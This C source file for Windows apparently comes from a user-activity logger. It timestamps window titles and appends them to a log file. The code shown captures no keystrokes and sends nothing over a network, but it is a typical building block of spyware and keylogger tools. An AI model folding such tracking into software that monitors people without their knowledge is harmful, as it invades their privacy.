#include "logs.h"

void	write_to_file(char *str)
{
	if (fd == NULL)
		return ;
	DWORD bytesWritten;
	WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL);
}

char	*GetDateFormated(void)
{
	LPSYSTEMTIME lpSystemTime = (LPSYSTEMTIME)malloc(sizeof(SYSTEMTIME));
	if (lpSystemTime == NULL)
		return NULL;

	GetLocalTime(lpSystemTime);
	if (lpSystemTime == NULL)
		return NULL;

	char *dateStr = (char *)malloc(22);
	if (dateStr == NULL)
	{
		free(lpSystemTime);
		return NULL;
	}

	sprintf_s(dateStr, 22, "%d.%d.%d %d:%d:%d",
		lpSystemTime->wDay, lpSystemTime->wMonth, lpSystemTime->wYear,
		lpSystemTime->wHour, lpSystemTime->wMinute, lpSystemTime->wSecond);
	free(lpSystemTime);
	return dateStr;
}

void get_foreground_window(HWND hwnd)
{
	wchar_t windowTitleW[256];
	if (GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)) == 0)
		return;

	char *dateStr = GetDateFormated();
	if (dateStr == NULL)
		return;

	int i = 0;
	while (windowTitleW[i] != '\0' && i < 256 - 1)
	{
		if (windowTitleW[i] == '\r' || windowTitleW[i] == '\n')
			windowTitleW[i] = ' ';
		i++;
	}
	windowTitleW[i] = '\0';

	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
	char *windowTitleUtf8 = (char *)malloc(utf8Len);
	if (!windowTitleUtf8) {
		free(dateStr);
		return;
	}
	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);

	char logEntry[1024];
	snprintf(logEntry, sizeof(logEntry), "[%s] - Foreground window title: %s\n", dateStr, windowTitleUtf8);
	write_to_file(logEntry);

	free(windowTitleUtf8);
	free(dateStr);
}
